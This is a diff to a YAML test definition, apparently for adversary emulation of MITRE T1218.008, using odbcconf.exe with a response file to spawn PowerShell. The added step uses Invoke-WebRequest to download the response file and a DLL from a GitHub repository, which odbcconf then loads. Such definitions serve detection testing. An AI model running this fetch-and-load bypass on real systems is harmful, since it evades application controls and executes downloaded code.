@@ -4,12 +4,12 @@ description: |
     Execute arbitrary response file that will spawn PowerShell.exe.
     Source files: https://github.com/woanware/application-restriction-bypasses
 args:
-    - name: rsp_file_path
-      type: string
-      default: PathToAtomicsFolder\T1218.008\bin\
     - name: rsp_file_name
       type: string
       default: T1218.008.rsp
+    - name: rsp_file_path
+      type: string
+      default: PathToAtomicsFolder\T1218.008\bin\
 uuid: 331ce274-f9c9-440b-9f8c-a1006e1fce0b
 mitre:
     tactics:
@@ -22,6 +22,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})
+      inline: |
+        if (Test-Path "#{rsp_file_path}#{rsp_file_name}") {exit 0} else {{Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp" -OutFile "#{rsp_file_path}#{rsp_file_name}"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll" -OutFile "#{rsp_file_path}\o.dll"
+        }}
+      executor: powershell
     - name: odbcconf.exe---load-response-file
       inline: |
         cd "{{.Args.rsp_file_path}}"
